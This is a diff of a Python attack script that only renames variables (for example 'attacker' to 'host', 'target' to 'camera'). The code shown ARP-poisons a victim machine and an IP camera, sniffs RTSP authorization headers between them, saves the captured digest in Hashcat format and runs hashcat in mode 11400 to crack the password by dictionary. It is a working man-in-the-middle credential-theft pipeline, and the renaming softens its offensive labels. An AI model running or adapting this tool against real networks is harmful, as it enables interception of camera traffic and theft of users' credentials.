@@ -112,15 +112,15 @@ if __name__ == "__main__":
     # Read command line arguments
     victim_ip = sys.argv[1]
     victim_mac = getmacbyip(victim_ip)
-    target_ip = sys.argv[2]
-    target_mac = getmacbyip(target_ip)
-    dict_file = os.path.abspath(sys.argv[3])
+    camera_ip = sys.argv[2]
+    camera_mac = getmacbyip(camera_ip)
+    dictionary_file = os.path.abspath(sys.argv[3])
     hashcat_dir = sys.argv[4] if len(sys.argv) > 4 else None
 
     # Get current device's IP and MAC
-    attacker_iface = conf.iface
-    attacker_ip = get_if_addr(attacker_iface)
-    attacker_mac = get_if_hwaddr(attacker_iface)
+    host_iface = conf.iface
+    host_ip = get_if_addr(host_iface)
+    host_mac = get_if_hwaddr(host_iface)
 
     # Create manager so we can return packet info from sniffer
     manager = Manager()
@@ -128,23 +128,23 @@ if __name__ == "__main__":
 
     # Create processes for poisoning and sniffing
     sniff_proc = Process(target=sniff_rtsp_authorization,
-                         args=(victim_ip, target_ip, shared))
+                         args=(victim_ip, camera_ip, shared))
     victim_proc = Process(target=arp_poison, args=(
-        attacker_iface, attacker_mac, victim_ip, victim_mac, target_ip))
-    target_proc = Process(target=arp_poison, args=(
-        attacker_iface, attacker_mac, target_ip, target_mac, victim_ip))
+        host_iface, host_mac, victim_ip, victim_mac, camera_ip))
+    camera_proc = Process(target=arp_poison, args=(
+        host_iface, host_mac, camera_ip, camera_mac, victim_ip))
 
     # Start processes
     print("Starting sniffing and poisoning...")
     sniff_proc.start()
     victim_proc.start()
-    target_proc.start()
+    camera_proc.start()
 
     # Wait for sniff process to exit
     sniff_proc.join()
     print("Stopping sniffing and poisoning...")
     victim_proc.terminate()
-    target_proc.terminate()
+    camera_proc.terminate()
 
     # A packet has been found, so output to Hashcat format
     auth = shared["auth"]
@@ -158,4 +158,4 @@ if __name__ == "__main__":
         os.chdir(hashcat_dir)
         hashcat_exe = os.path.join(os.getcwd(), hashcat_exe)
     subprocess.run([hashcat_exe, "-m", "11400", "-a", "0", target_file,
-                   dict_file, "--potfile-disable", "-o", cracked_file])
+                   dictionary_file, "--potfile-disable", "-o", cracked_file])
